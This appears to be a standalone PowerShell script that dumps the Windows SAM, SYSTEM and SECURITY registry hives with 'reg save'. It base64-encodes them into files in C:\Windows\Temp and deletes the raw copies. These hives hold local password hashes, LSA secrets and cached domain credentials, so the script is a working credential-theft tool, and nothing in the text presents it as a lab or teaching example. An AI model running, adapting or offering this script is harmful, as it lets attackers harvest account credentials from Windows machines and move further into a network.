# Temp folder for intermediate files
$tempFolder = Join-Path $env:TEMP "regdump_$([guid]::NewGuid())"
New-Item -Path $tempFolder -ItemType Directory | Out-Null

# Output folder: C:\Windows\Temp
$outputFolder = "C:\Windows\Temp"

try {
    # Define registry hives and output filenames
    $hives = @{
        "sam"    = "SAM"
        "system" = "SYSTEM"
        "security" = "SECURITY"
    }

    foreach ($key in $hives.Keys) {
        $tempFile = Join-Path $tempFolder $hives[$key]
        $outputFile = Join-Path $outputFolder "$($hives[$key])_dump_base64.txt"

        # Run reg save command to temp file
        $saveCmd = "reg save HKLM\$key `"$tempFile`" /y"
        cmd.exe /c $saveCmd | Out-Null

        # Read file bytes into memory
        $bytes = [System.IO.File]::ReadAllBytes($tempFile)

        # Base64 encode bytes
        $base64 = [Convert]::ToBase64String($bytes)

        # Save base64 content to output file in C:\Windows\Temp
        Set-Content -Path $outputFile -Value $base64

        # Delete temp file immediately
        Remove-Item $tempFile -Force
    }

    Write-Output "All hive dumps saved as separate base64 files in C:\Windows\Temp."
}
finally {
    # Cleanup temp folder
    Remove-Item -Path $tempFolder -Recurse -Force
}
